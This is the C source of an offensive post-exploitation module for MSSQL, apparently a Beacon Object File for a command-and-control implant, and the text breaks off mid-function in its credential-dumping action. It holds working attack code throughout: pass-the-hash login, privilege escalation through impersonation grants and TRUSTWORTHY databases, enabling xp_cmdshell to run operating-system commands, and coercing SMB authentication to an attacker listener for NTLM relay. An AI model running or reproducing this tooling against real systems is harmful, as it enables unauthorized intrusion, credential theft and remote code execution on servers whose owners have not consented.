/*
 * mssqlbof — unified MSSQL BOF with action dispatch.
 * Author: 0xmaz
 *
 * Usage:
 *   mssql --action find
 *   mssql --action info --host SQL01
 *   mssql --action query --host SQL01 --sql "SELECT @@VERSION"
 *   mssql --action links --host SQL01
 *   mssql --action exec --host SQL01 --cmd "whoami"
 *   mssql --action impersonate --host SQL01 --discover
 *   mssql --action impersonate --host SQL01 --login sa --sql "SELECT 1"
 *   mssql --action privesc --host SQL01
 *   mssql --action coerce --host SQL01 --to "\\listener\x"
 *   mssql --action passwords --host SQL01
 *   mssql --action chain --host SQL01 --via LINK --sql "SELECT @@VERSION"
 *
 * Auth flags (apply to every action except find):
 *   --auth sspi                                    (default, current beacon thread token)
 *   --auth ntlm --domain D --user U --pass P       explicit NTLM plaintext
 *   --auth ntlm --domain D --user U --hash <NT>    pass-the-hash (manual NTLMv2)
 *   --auth sql  --user U --pass P                  SQL authentication
 *
 * Examples:
 *   mssql --action info --host SQL01 --auth sspi
 *   mssql --action exec --host SQL01 --cmd whoami --auth ntlm --domain CORP --user alice --pass P@ss
 *   mssql --action info --host SQL01 --auth ntlm --domain CORP --user alice --hash e19c...f42
 *   mssql --action info --host SQL01 --auth sql  --user sa    --pass SqlPass123!
 */

#include <winsock2.h>
#include <windows.h>
#include "../bof_compat/beacon.h"
#include "../common/dynimports.h"
#include "../common/args.h"
#include "../tds/tds.h"

static void ascii_to_wide(const char *in, wchar_t *out, size_t outlen) {
    size_t i = 0;
    for (; i < outlen - 1 && in && in[i]; ++i) out[i] = (wchar_t)(unsigned char)in[i];
    out[i] = 0;
}
static int str_eq(const char *a, const char *b) {
    if (!a || !b) return 0;
    while (*a && *b) { if (*a != *b) return 0; ++a; ++b; }
    return *a == *b;
}

/* ---- find ---- */
static void action_find(int json) {
    (void)json;
    void *ld = WLDAP32$ldap_initW(NULL, 389);
    if (!ld) { BeaconPrintf(CALLBACK_ERROR, "[!] ldap_initW failed"); return; }
    ULONG ver = 3;
    WLDAP32$ldap_set_option(ld, 0x11, &ver);
    if (WLDAP32$ldap_bind_sW(ld, NULL, NULL, 0x0486) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] ldap_bind_sW failed");
        WLDAP32$ldap_unbind(ld); return;
    }
    wchar_t *attrs[] = { L"defaultNamingContext", NULL };
    void *res = NULL;
    if (WLDAP32$ldap_search_sW(ld, (wchar_t*)L"", 0, L"(objectClass=*)", attrs, 0, &res) != 0 || !res) {
        BeaconPrintf(CALLBACK_ERROR, "[!] rootDSE search failed");
        WLDAP32$ldap_unbind(ld); return;
    }
    void *entry = WLDAP32$ldap_first_entry(ld, res);
    wchar_t base[256] = {0};
    if (entry) {
        wchar_t **dnc = WLDAP32$ldap_get_valuesW(ld, entry, L"defaultNamingContext");
        if (dnc && dnc[0]) {
            for (int i = 0; i < 255 && dnc[0][i]; ++i) base[i] = dnc[0][i];
            WLDAP32$ldap_value_freeW(dnc);
        }
    }
    WLDAP32$ldap_msgfree(res);

    wchar_t *attrs2[] = { L"servicePrincipalName", L"sAMAccountName", NULL };
    res = NULL;
    if (WLDAP32$ldap_search_sW(ld, base, 2, L"(servicePrincipalName=MSSQLSvc/*)",
                               attrs2, 0, &res) != 0 || !res) {
        BeaconPrintf(CALLBACK_ERROR, "[!] SPN search failed");
        WLDAP32$ldap_unbind(ld); return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "%-42s %s", "SPN", "Account");
    for (entry = WLDAP32$ldap_first_entry(ld, res); entry;
         entry = WLDAP32$ldap_next_entry(ld, entry)) {
        wchar_t **spns  = WLDAP32$ldap_get_valuesW(ld, entry, L"servicePrincipalName");
        wchar_t **names = WLDAP32$ldap_get_valuesW(ld, entry, L"sAMAccountName");
        const wchar_t *acct = (names && names[0]) ? names[0] : L"?";
        if (spns) {
            for (int i = 0; spns[i]; ++i) {
                const wchar_t *s = spns[i];
                if (s[0]==L'M'&&s[1]==L'S'&&s[2]==L'S'&&s[3]==L'Q'&&s[4]==L'L'&&s[5]==L'S'&&
                    s[6]==L'v'&&s[7]==L'c'&&s[8]==L'/')
                    BeaconPrintf(CALLBACK_OUTPUT, "%-42ls %ls", s, acct);
            }
            WLDAP32$ldap_value_freeW(spns);
        }
        if (names) WLDAP32$ldap_value_freeW(names);
    }
    WLDAP32$ldap_msgfree(res);
    WLDAP32$ldap_unbind(ld);
}

/* ---- build auth struct from CLI flags ---- */
static void build_auth(bof_args_t *a, tds_auth_t *au,
                       wchar_t *wu, wchar_t *wp, wchar_t *wd) {
    const char *mode = bof_args_str_flag(a, "--auth", "sspi");
    const char *u = bof_args_str_flag(a, "--user", NULL);
    const char *p = bof_args_str_flag(a, "--pass", NULL);
    const char *d = bof_args_str_flag(a, "--domain", NULL);
    const char *h = bof_args_str_flag(a, "--hash", NULL);
    if (u) ascii_to_wide(u, wu, 128); else wu[0] = 0;
    if (p) ascii_to_wide(p, wp, 128); else wp[0] = 0;
    if (d) ascii_to_wide(d, wd, 64);  else wd[0] = 0;
    au->user   = wu[0] ? wu : NULL;
    au->pass   = wp[0] ? wp : NULL;
    au->domain = wd[0] ? wd : NULL;
    au->hash   = h;
    if (str_eq(mode, "sql"))       au->mode = TDS_AUTH_SQL;
    else if (h)                    au->mode = TDS_AUTH_NTLM_HASH;  /* implicit */
    else if (str_eq(mode, "ntlm")) au->mode = TDS_AUTH_SSPI_EXPLICIT;
    else                           au->mode = TDS_AUTH_SSPI_CURRENT;
}

/* ---- common connect ---- */
static int do_connect(const char *host, int port, tds_auth_t *au, tds_conn_t **c) {
    wchar_t whost[256];
    ascii_to_wide(host, whost, 256);
    int rc = tds_connect_ex(whost, (uint16_t)port, NULL, NULL, au, c);
    if (rc != TDS_OK || !*c) return rc;
    /* Primer SELECT right after connect. The first SQLBatch following a
     * multi-leg SSPI/NTLM login reads stale bytes from the post-LOGINACK
     * phase; a throwaway SELECT drains them. Printing the result through
     * BeaconPrintf is what completes the drain, so we use it for the
     * "connected as" line every action emits. */
    tds_result_t *_p = NULL;
    if (tds_query(*c, L"SELECT SUSER_SNAME(),@@SERVERNAME", &_p) == TDS_OK && _p && tds_result_next_row(_p) == 1) {
        wchar_t _u[128], _s[128];
        tds_result_get_str(_p, 0, _u, 128);
        tds_result_get_str(_p, 1, _s, 128);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] connected as %ls @ %ls", _u, _s);
    }
    if (_p) tds_result_free(_p);
    return rc;
}

static void print_rows(tds_result_t *r) {
    int n = tds_result_get_col_count(r);
    wchar_t *line = (wchar_t*)MSVCRT$malloc(4096 * sizeof(wchar_t));
    wchar_t *cell = (wchar_t*)MSVCRT$malloc(1024 * sizeof(wchar_t));
    if (!line || !cell) { if (line) MSVCRT$free(line); if (cell) MSVCRT$free(cell); return; }
    size_t pos = 0;
    for (int i = 0; i < n && pos < 4000; ++i) {
        const wchar_t *cn = tds_result_get_col_name(r, i);
        for (int j = 0; cn[j] && pos < 4000; ++j) line[pos++] = cn[j];
        if (i + 1 < n && pos < 4000) line[pos++] = L'\t';
    }
    line[pos] = 0;
    BeaconPrintf(CALLBACK_OUTPUT, "%ls", line);
    int rows = 0;
    while (tds_result_next_row(r) == 1) {
        pos = 0; line[0] = 0;
        for (int i = 0; i < n && pos < 4000; ++i) {
            tds_result_get_str(r, i, cell, 1024);
            for (int j = 0; cell[j] && pos < 4000; ++j) line[pos++] = cell[j];
            if (i + 1 < n && pos < 4000) line[pos++] = L'\t';
        }
        line[pos] = 0;
        BeaconPrintf(CALLBACK_OUTPUT, "%ls", line);
        ++rows;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "(%d row%s)", rows, rows == 1 ? "" : "s");
    MSVCRT$free(line); MSVCRT$free(cell);
}

/* ---- info ---- */
static void action_info(const char *host, int port, tds_auth_t *au) {
    tds_conn_t *c = NULL;
    int rc = do_connect(host, port, au, &c);
    if (rc != TDS_OK) {
        BeaconPrintf(CALLBACK_ERROR, "[!] connect failed (%d): %ls", rc, tds_last_error(c));
        if (c) tds_close(c);
        return;
    }
    tds_result_t *r = NULL;
    rc = tds_query(c,
        L"SELECT SUSER_SNAME(),"
        L"       CAST(SERVERPROPERTY('ProductVersion') AS NVARCHAR(50)),"
        L"       CAST(SERVERPROPERTY('Edition') AS NVARCHAR(100)),"
        L"       CAST(IS_SRVROLEMEMBER('sysadmin') AS INT),"
        L"       DB_NAME(),"
        L"       @@SERVERNAME,"
        L"       @@VERSION", &r);
    if (rc == TDS_OK && r && tds_result_next_row(r) == 1) {
        wchar_t pv[64], ed[128], su[128], dn[128], srv[128];
        int64_t sa = 0;
        wchar_t *ver = (wchar_t*)MSVCRT$malloc(2048 * sizeof(wchar_t));
        if (ver) {
            MSVCRT$memset(ver, 0, 2048 * sizeof(wchar_t));
            tds_result_get_str(r, 0, su, 128);
            tds_result_get_str(r, 1, pv, 64);
            tds_result_get_str(r, 2, ed, 128);
            tds_result_get_i64(r, 3, &sa);
            tds_result_get_str(r, 4, dn, 128);
            tds_result_get_str(r, 5, srv, 128);
            tds_result_get_str(r, 6, ver, 2048);
            BeaconPrintf(CALLBACK_OUTPUT, "Server         : %ls", srv);
            BeaconPrintf(CALLBACK_OUTPUT, "Version        : %ls (%ls)", pv, ed);
            BeaconPrintf(CALLBACK_OUTPUT, "Current user   : %ls", su);
            BeaconPrintf(CALLBACK_OUTPUT, "Is sysadmin    : %s", sa ? "YES" : "no");
            BeaconPrintf(CALLBACK_OUTPUT, "Current DB     : %ls", dn);
            BeaconPrintf(CALLBACK_OUTPUT, "Banner         : %ls", ver);
            MSVCRT$free(ver);
        }
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[!] info query failed (%d): %ls", rc, tds_last_error(c));
    }
    if (r) tds_result_free(r);
    tds_close(c);
}

/* ---- query ---- */
static void action_query(const char *host, int port, tds_auth_t *au, const char *sql) {
    tds_conn_t *c = NULL;
    int rc = do_connect(host, port, au, &c);
    if (rc != TDS_OK) {
        BeaconPrintf(CALLBACK_ERROR, "[!] connect failed (%d): %ls", rc, tds_last_error(c));
        if (c) tds_close(c);
        return;
    }
    wchar_t *wsql = (wchar_t*)MSVCRT$malloc(4096 * sizeof(wchar_t));
    if (!wsql) { tds_close(c); return; }
    ascii_to_wide(sql, wsql, 4096);
    tds_result_t *r = NULL;
    rc = tds_query(c, wsql, &r);
    MSVCRT$free(wsql);
    if (rc != TDS_OK || !r) {
        BeaconPrintf(CALLBACK_ERROR, "[!] query failed (%d): %ls", rc, tds_last_error(c));
        if (r) tds_result_free(r);
        tds_close(c);
        return;
    }
    print_rows(r);
    tds_result_free(r);
    tds_close(c);
}

/* ---- links ---- */
static void action_links(const char *host, int port, tds_auth_t *au) {
    tds_conn_t *c = NULL;
    int rc = do_connect(host, port, au, &c);
    if (rc != TDS_OK) {
        BeaconPrintf(CALLBACK_ERROR, "[!] connect failed (%d): %ls", rc, tds_last_error(c));
        if (c) tds_close(c);
        return;
    }
    tds_result_t *r = NULL;
    rc = tds_query(c,
        L"SELECT s.name, s.product, s.provider, s.data_source,"
        L"       CAST(s.is_rpc_out_enabled AS INT),"
        L"       CAST(s.is_data_access_enabled AS INT) "
        L"FROM sys.servers s WHERE s.is_linked = 1 ORDER BY s.name", &r);
    if (rc != TDS_OK || !r) {
        BeaconPrintf(CALLBACK_ERROR, "[!] links query failed (%d)", rc);
        if (r) tds_result_free(r);
        tds_close(c);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "Linked servers reachable from %s:", host);
    int n = 0;
    wchar_t name[128], product[64], provider[64], src[256];
    int64_t rpc_out, data_access;
    while (tds_result_next_row(r) == 1) {
        tds_result_get_str(r, 0, name, 128);
        tds_result_get_str(r, 1, product, 64);
        tds_result_get_str(r, 2, provider, 64);
        tds_result_get_str(r, 3, src, 256);
        tds_result_get_i64(r, 4, &rpc_out);
        tds_result_get_i64(r, 5, &data_access);
        BeaconPrintf(CALLBACK_OUTPUT, " - %ls (%ls / %ls -> %ls) rpc_out=%d data=%d",
                     name, product, provider, src, (int)rpc_out, (int)data_access);
        ++n;
    }
    if (n == 0) BeaconPrintf(CALLBACK_OUTPUT, " (no linked servers configured)");
    BeaconPrintf(CALLBACK_OUTPUT, "Total: %d", n);
    tds_result_free(r);
    tds_close(c);
}

/* ---- exec ---- */
static int run_simple(tds_conn_t *c, const wchar_t *sql) {
    tds_result_t *r = NULL;
    int rc = tds_query(c, sql, &r);
    if (r) tds_result_free(r);
    return rc;
}
static int read_xp(tds_conn_t *c, const wchar_t *option, int64_t *out) {
    wchar_t sql[256] = L"SELECT CAST(value_in_use AS INT) FROM sys.configurations WHERE name = '";
    size_t pos = 0; while (sql[pos]) ++pos;
    for (int i = 0; option[i] && pos < 250; ++i) sql[pos++] = option[i];
    sql[pos++] = L'\''; sql[pos] = 0;
    tds_result_t *r = NULL;
    int rc = tds_query(c, sql, &r);
    if (rc != TDS_OK || !r) { if (r) tds_result_free(r); return rc; }
    if (tds_result_next_row(r) != 1) { tds_result_free(r); return TDS_ERR_PROTOCOL; }
    rc = tds_result_get_i64(r, 0, out);
    tds_result_free(r);
    return rc;
}
/* Discover the first sysadmin login we can EXECUTE AS. Returns wide name
 * in `out` or leaves it empty if none found. */
static void discover_impersonate_target(tds_conn_t *c, wchar_t *out, size_t outlen) {
    out[0] = 0;
    /* Real-world-robust version:
     *  - Only considers GRANT / GRANT_WITH_GRANT states (not DENY)
     *  - Orders by: sa first, then known sysadmins, then others
     *  - ISNULL wraps IS_SRVROLEMEMBER in case we can't see the target */
    tds_result_t *r = NULL;
    int rc = tds_query(c,
        L"SELECT TOP 1 b.name "
        L"FROM sys.server_permissions a "
        L"JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id "
        L"WHERE a.permission_name = 'IMPERSONATE' "
        L"  AND a.state IN ('G','W') "
        L"ORDER BY CASE WHEN b.name = 'sa' THEN 0 "
        L"              WHEN ISNULL(IS_SRVROLEMEMBER('sysadmin', b.name), 0) = 1 THEN 1 "
        L"              ELSE 2 END, b.name", &r);
    if (rc == TDS_OK && r && tds_result_next_row(r) == 1) {
        tds_result_get_str(r, 0, out, outlen);
    }
    if (r) tds_result_free(r);
}

/* Find a TRUSTWORTHY database owned by a sysadmin. If found, hopping
 * through dbo in that database runs as the db owner's login context. */
/* Returns up to 8 candidate TRUSTWORTHY dbs in `out`, one per entry.
 * Non-system dbs first (since the caller may not be mapped into msdb). */
static int discover_trustworthy_dbs(tds_conn_t *c, wchar_t out[][128], int max_out) {
    int n = 0;
    /* Real-world-robust:
     *  - LEFT JOIN handles orphaned owner SIDs (no principal mapping)
     *  - state != 3 excludes OFFLINE but keeps EMERGENCY / RECOVERY_PENDING
     *  - Falls back to SUSER_SNAME lookup for orphaned owners
     *  - Prefers user dbs over system dbs (we may not be mapped in msdb) */
    tds_result_t *r = NULL;
    int rc = tds_query(c,
        L"SELECT d.name "
        L"FROM sys.databases d "
        L"LEFT JOIN sys.server_principals sp ON d.owner_sid = sp.sid "
        L"WHERE d.is_trustworthy_on = 1 "
        L"  AND d.state <> 3 "
        L"  AND (ISNULL(IS_SRVROLEMEMBER('sysadmin', sp.name), 0) = 1 "
        L"       OR ISNULL(IS_SRVROLEMEMBER('sysadmin', SUSER_SNAME(d.owner_sid)), 0) = 1) "
        L"ORDER BY CASE WHEN d.database_id > 4 THEN 0 ELSE 1 END, d.name", &r);
    if (rc == TDS_OK && r) {
        while (n < max_out && tds_result_next_row(r) == 1) {
            tds_result_get_str(r, 0, out[n], 128);
            ++n;
        }
    }
    if (r) tds_result_free(r);
    return n;
}

static int is_sysadmin(tds_conn_t *c) {
    tds_result_t *r = NULL;
    int rc = tds_query(c, L"SELECT CAST(IS_SRVROLEMEMBER('sysadmin') AS INT)", &r);
    int64_t v = 0;
    if (rc == TDS_OK && r && tds_result_next_row(r) == 1) {
        tds_result_get_i64(r, 0, &v);
    }
    if (r) tds_result_free(r);
    return v ? 1 : 0;
}

/* Try the EXECUTE AS LOGIN technique. Returns 1 on success. Prints diag. */
static int try_imp_login(tds_conn_t *c, wchar_t *used_login_out, size_t outlen) {
    wchar_t login[128] = {0};
    discover_impersonate_target(c, login, 128);
    if (!login[0]) return 0;
    wchar_t sql[256] = L"EXECUTE AS LOGIN = '";
    size_t p = 0; while (sql[p]) ++p;
    for (int i = 0; login[i] && p < 240; ++i) sql[p++] = login[i];
    sql[p++] = L'\''; sql[p] = 0;
    tds_result_t *r = NULL;
    int rc = tds_query(c, sql, &r);
    if (r) tds_result_free(r);
    if (rc != TDS_OK) return 0;
    if (is_sysadmin(c)) {
        for (size_t i = 0; i < outlen - 1 && login[i]; ++i) used_login_out[i] = login[i];
        used_login_out[127] = 0;
        return 1;
    }
    run_simple(c, L"REVERT;");
    return 0;
}

/* Try the TRUSTWORTHY database technique — iterates through every
 * TRUSTWORTHY db owned by a sysadmin and returns on the first one where
 * USE + EXECUTE AS USER = 'dbo' yields sysadmin. */
static int try_imp_trustworthy(tds_conn_t *c, wchar_t *used_db_out, size_t outlen) {
    wchar_t cands[8][128];
    int n = discover_trustworthy_dbs(c, cands, 8);
    for (int k = 0; k < n; ++k) {
        wchar_t sql[512] = {0};
        size_t p = 0;
        const wchar_t *pfx = L"USE [";
        while (*pfx && p < 500) sql[p++] = *pfx++;
        for (int i = 0; cands[k][i] && p < 490; ++i) sql[p++] = cands[k][i];
        const wchar_t *mid = L"]; EXECUTE AS USER = 'dbo';";
        while (*mid && p < 510) sql[p++] = *mid++;
        sql[p] = 0;
        if (run_simple(c, sql) != TDS_OK) continue;
        if (is_sysadmin(c)) {
            for (size_t i = 0; i < outlen - 1 && cands[k][i]; ++i)
                used_db_out[i] = cands[k][i];
            used_db_out[outlen-1] = 0;
            return 1;
        }
        run_simple(c, L"REVERT;");
    }
    return 0;
}

/* Find any database I own (db_owner) that is TRUSTWORTHY and owned by a
 * sysadmin at the SERVER level. EXECUTE AS USER='dbo' there gives me
 * sysadmin context via the trust chain. Doesn't need IMPERSONATE grant. */
static int discover_owned_trust_dbs(tds_conn_t *c, wchar_t out[][128], int max_out) {
    int n = 0;
    tds_result_t *r = NULL;
    int rc = tds_query(c,
        L"SELECT d.name "
        L"FROM sys.databases d "
        L"WHERE d.is_trustworthy_on = 1 "
        L"  AND d.state <> 3 "
        L"  AND ISNULL(IS_SRVROLEMEMBER('sysadmin', SUSER_SNAME(d.owner_sid)), 0) = 1 "
        L"  AND HAS_DBACCESS(d.name) = 1", &r);
    if (rc == TDS_OK && r) {
        while (n < max_out && tds_result_next_row(r) == 1) {
            tds_result_get_str(r, 0, out[n], 128);
            ++n;
        }
    }
    if (r) tds_result_free(r);
    return n;
}

/* Privesc dispatch. Returns 1 if we are (or became) sysadmin.
 * Method: "login" | "trustworthy" | "auto" | "none". */
static int do_privesc(tds_conn_t *c, const char *method, wchar_t *via_desc, size_t desc_len) {
    via_desc[0] = 0;
    if (is_sysadmin(c)) {
        const wchar_t *d = L"already sysadmin";
        for (size_t i = 0; i < desc_len - 1 && d[i]; ++i) via_desc[i] = d[i];
        via_desc[desc_len-1] = 0;
        return 1;
    }
    if (str_eq(method, "none")) return 0;

    int try_login = (str_eq(method, "login") || str_eq(method, "auto"));
    int try_trust = (str_eq(method, "trustworthy") || str_eq(method, "auto"));

    if (try_login) {
        wchar_t login[128];
        if (try_imp_login(c, login, 128)) {
            /* via: login <name> */
            const wchar_t *p1 = L"EXECUTE AS LOGIN = ";
            size_t p = 0;
            while (*p1 && p < desc_len - 1) via_desc[p++] = *p1++;
            for (int i = 0; login[i] && p < desc_len - 1; ++i) via_desc[p++] = login[i];
            via_desc[p] = 0;
            return 1;
        }
    }
    if (try_trust) {
        wchar_t db[128];
        if (try_imp_trustworthy(c, db, 128)) {
            const wchar_t *p1 = L"TRUSTWORTHY db ";
            size_t p = 0;
            while (*p1 && p < desc_len - 1) via_desc[p++] = *p1++;
            for (int i = 0; db[i] && p < desc_len - 1; ++i) via_desc[p++] = db[i];
            via_desc[p] = 0;
            return 1;
        }
    }
    return 0;
}

static void action_exec(const char *host, int port, tds_auth_t *au,
                        const char *cmd, int no_restore, const char *imp_method) {
    tds_conn_t *c = NULL;
    int rc = do_connect(host, port, au, &c);
    if (rc != TDS_OK) {
        BeaconPrintf(CALLBACK_ERROR, "[!] connect failed (%d): %ls", rc, tds_last_error(c));
        if (c) tds_close(c);
        return;
    }

    /* Privesc dispatch: try to become sysadmin via --impersonate method. */
    wchar_t via[128] = {0};
    int impersonating = 0;
    if (!do_privesc(c, imp_method, via, 128)) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] not sysadmin and no privesc worked (tried method=%s)", imp_method);
        tds_close(c);
        return;
    }
    /* "already sysadmin" is not an impersonation we need to revert */
    if (via[0] && !(via[0] == L'a' && via[1] == L'l')) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] privesc via: %ls", via);
        impersonating = 1;
    }

    int64_t prev_show = 0, prev_xp = 0;
    read_xp(c, L"show advanced options", &prev_show);
    read_xp(c, L"xp_cmdshell", &prev_xp);
    if (!prev_xp) {
        if (!prev_show)
            run_simple(c, L"EXEC sp_configure 'show advanced options', 1; RECONFIGURE;");
        run_simple(c, L"EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;");
    }
    wchar_t *sql = (wchar_t*)MSVCRT$malloc(8192 * sizeof(wchar_t));
    if (!sql) { tds_close(c); return; }
    size_t pos = 0;
    const wchar_t *p = L"EXEC xp_cmdshell '";
    while (*p && pos < 8180) sql[pos++] = *p++;
    for (size_t i = 0; cmd[i] && pos < 8180; ++i) {
        if (cmd[i] == '\'') sql[pos++] = L'\'';
        sql[pos++] = (wchar_t)(unsigned char)cmd[i];
    }
    sql[pos++] = L'\''; sql[pos] = 0;
    tds_result_t *r = NULL;
    rc = tds_query(c, sql, &r);
    MSVCRT$free(sql);
    if (rc != TDS_OK || !r) {
        BeaconPrintf(CALLBACK_ERROR, "[!] xp_cmdshell failed (%d): %ls", rc, tds_last_error(c));
        if (r) tds_result_free(r);
    } else {
        wchar_t *line = (wchar_t*)MSVCRT$malloc(2048 * sizeof(wchar_t));
        if (line) {
            while (tds_result_next_row(r) == 1) {
                if (tds_result_is_null(r, 0)) continue;
                tds_result_get_str(r, 0, line, 2048);
                BeaconPrintf(CALLBACK_OUTPUT, "%ls", line);
            }
            MSVCRT$free(line);
        }
        tds_result_free(r);
    }
    if (!no_restore) {
        if (!prev_xp)   run_simple(c, L"EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;");
        if (!prev_show) run_simple(c, L"EXEC sp_configure 'show advanced options', 0; RECONFIGURE;");
    }
    if (impersonating) run_simple(c, L"REVERT;");
    tds_close(c);
}

/* ---- privesc enum ---- recon every visible privesc path without using any */
static void action_privesc_enum(const char *host, int port, tds_auth_t *au) {
    tds_conn_t *c = NULL;
    int rc = do_connect(host, port, au, &c);
    if (rc != TDS_OK) {
        BeaconPrintf(CALLBACK_ERROR, "[!] connect failed (%d): %ls", rc, tds_last_error(c));
        if (c) tds_close(c);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "=== Privesc surface enumeration ===");

    /* 1. Current state */
    int sa = is_sysadmin(c);
    BeaconPrintf(CALLBACK_OUTPUT, "[1] sysadmin: %s", sa ? "YES — already" : "no");
    if (sa) { tds_close(c); return; }

    /* 2. Logins we can EXECUTE AS via IMPERSONATE */
    tds_result_t *r = NULL;
    rc = tds_query(c,
        L"SELECT b.name, ISNULL(IS_SRVROLEMEMBER('sysadmin', b.name), 0) AS is_sa "
        L"FROM sys.server_permissions a "
        L"JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id "
        L"WHERE a.permission_name = 'IMPERSONATE' AND a.state IN ('G','W')", &r);
    if (rc == TDS_OK && r) {
        BeaconPrintf(CALLBACK_OUTPUT, "[2] IMPERSONATE grants:");
        wchar_t name[128]; int64_t isa; int n = 0;
        while (tds_result_next_row(r) == 1) {
            tds_result_get_str(r, 0, name, 128);
            tds_result_get_i64(r, 1, &isa);
            BeaconPrintf(CALLBACK_OUTPUT, "    - %ls %s",
                         name, isa ? "(SYSADMIN — direct privesc)" : "");
            ++n;
        }
        if (n == 0) BeaconPrintf(CALLBACK_OUTPUT, "    (none)");
    }
    if (r) tds_result_free(r);

    /* 3. TRUSTWORTHY dbs owned by sysadmin */
    r = NULL;
    rc = tds_query(c,
        L"SELECT d.name, SUSER_SNAME(d.owner_sid) AS owner, "
        L"       CAST(HAS_DBACCESS(d.name) AS INT) AS my_access "
        L"FROM sys.databases d "
        L"WHERE d.is_trustworthy_on = 1 AND d.state <> 3 "
        L"  AND ISNULL(IS_SRVROLEMEMBER('sysadmin', SUSER_SNAME(d.owner_sid)), 0) = 1", &r);
    if (rc == TDS_OK && r) {
        BeaconPrintf(CALLBACK_OUTPUT, "[3] TRUSTWORTHY dbs owned by a sysadmin:");
        wchar_t name[128], owner[128]; int64_t access; int n = 0;
        while (tds_result_next_row(r) == 1) {
            tds_result_get_str(r, 0, name, 128);
            tds_result_get_str(r, 1, owner, 128);
            tds_result_get_i64(r, 2, &access);
            BeaconPrintf(CALLBACK_OUTPUT, "    - %ls (owner=%ls, my_access=%s)",
                         name, owner, access ? "yes — TRUSTWORTHY HOP available" : "no");
            ++n;
        }
        if (n == 0) BeaconPrintf(CALLBACK_OUTPUT, "    (none)");
    }
    if (r) tds_result_free(r);

    /* 4. Linked servers — potential auth chain */
    r = NULL;
    rc = tds_query(c,
        L"SELECT s.name, s.product, l.remote_name "
        L"FROM sys.servers s "
        L"LEFT JOIN sys.linked_logins l ON s.server_id = l.server_id "
        L"WHERE s.is_linked = 1", &r);
    if (rc == TDS_OK && r) {
        BeaconPrintf(CALLBACK_OUTPUT, "[4] Linked servers (potential chain pivot):");
        wchar_t name[128], prod[64], rn[128]; int n = 0;
        while (tds_result_next_row(r) == 1) {
            tds_result_get_str(r, 0, name, 128);
            tds_result_get_str(r, 1, prod, 64);
            tds_result_get_str(r, 2, rn, 128);
            BeaconPrintf(CALLBACK_OUTPUT, "    - %ls (%ls) -> %ls",
                         name, prod, rn[0] ? rn : L"use_self");
            ++n;
        }
        if (n == 0) BeaconPrintf(CALLBACK_OUTPUT, "    (none)");
    }
    if (r) tds_result_free(r);

    /* 5. Server-level permissions worth knowing about */
    r = NULL;
    rc = tds_query(c,
        L"SELECT permission_name FROM fn_my_permissions(NULL, 'SERVER') "
        L"WHERE permission_name IN ('CONTROL SERVER','ALTER ANY LOGIN',"
        L"  'ALTER ANY SERVER ROLE','ALTER ANY DATABASE','CONNECT SQL',"
        L"  'CREATE ANY DATABASE','VIEW SERVER STATE')", &r);
    if (rc == TDS_OK && r) {
        BeaconPrintf(CALLBACK_OUTPUT, "[5] My server-level permissions:");
        wchar_t perm[128]; int n = 0;
        while (tds_result_next_row(r) == 1) {
            tds_result_get_str(r, 0, perm, 128);
            BeaconPrintf(CALLBACK_OUTPUT, "    - %ls", perm);
            ++n;
        }
        if (n == 0) BeaconPrintf(CALLBACK_OUTPUT, "    (none of the privesc-relevant ones)");
    }
    if (r) tds_result_free(r);

    /* 6. xp_cmdshell state — just informational */
    int64_t xp = 0;
    read_xp(c, L"xp_cmdshell", &xp);
    BeaconPrintf(CALLBACK_OUTPUT, "[6] xp_cmdshell currently: %s", xp ? "ENABLED" : "disabled");

    BeaconPrintf(CALLBACK_OUTPUT, "===");
    BeaconPrintf(CALLBACK_OUTPUT, "Suggested: --action exec --impersonate auto --cmd whoami");

    tds_close(c);
}

/* ---- coerce ---- SMB auth coercion via xp_dirtree for NetNTLM relay/capture */
static void action_coerce(const char *host, int port, tds_auth_t *au,
                          const char *target_unc, const char *imp_method) {
    tds_conn_t *c = NULL;
    int rc = do_connect(host, port, au, &c);
    if (rc != TDS_OK) {
        BeaconPrintf(CALLBACK_ERROR, "[!] connect failed (%d): %ls", rc, tds_last_error(c));
        if (c) tds_close(c);
        return;
    }
    /* xp_dirtree requires PUBLIC by default, no privesc strictly needed,
     * but xp_fileexist / xp_subdirs variants do. Try privesc if needed. */
    wchar_t via[128] = {0};
    int impersonating = 0;
    if (!is_sysadmin(c)) {
        if (do_privesc(c, imp_method, via, 128) && via[0] && via[0] != L'a') {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] privesc via: %ls", via);
            impersonating = 1;
        }
    }
    /* Build EXEC master..xp_dirtree '<unc>' */
    wchar_t sql[1024];
    size_t p = 0;
    const wchar_t *pfx = L"EXEC master..xp_dirtree '";
    while (*pfx && p < 1000) sql[p++] = *pfx++;
    for (size_t i = 0; target_unc[i] && p < 1000; ++i)
        sql[p++] = (wchar_t)(unsigned char)target_unc[i];
    sql[p++] = L'\''; sql[p] = 0;
    BeaconPrintf(CALLBACK_OUTPUT, "[*] triggering SMB auth from SQL service to %s", target_unc);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] listen with responder/inveigh/impacket-smbserver on that share");
    int rc2 = run_simple(c, sql);
    if (rc2 != TDS_OK) {
        BeaconPrintf(CALLBACK_ERROR, "[!] xp_dirtree failed (%d): %ls", rc2, tds_last_error(c));
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] xp_dirtree fired — check your listener");
    }
    if (impersonating) run_simple(c, L"REVERT;");
    tds_close(c);
}

/* ---- passwords ---- dump linked-server credentials (sysadmin required) */
static void action_passwords(const char *host, int port, tds_auth_t *au,
                             const char *imp_method) {
    tds_conn_t *c = NULL;
    int rc = do_connect(host, port, au, &c);
    if (rc != TDS_OK) {
        BeaconPrintf(CALLBACK_ERROR, "[!] connect failed (%d): %ls", rc, tds_last_error(c));
        if (c) tds_close(c);
        return;
    }
    wchar_t via[128] = {0};
    int impersonating = 0;
    if (!is_sysadmin(c)) {
        if (!do_privesc(c, imp_method, via, 128)) {
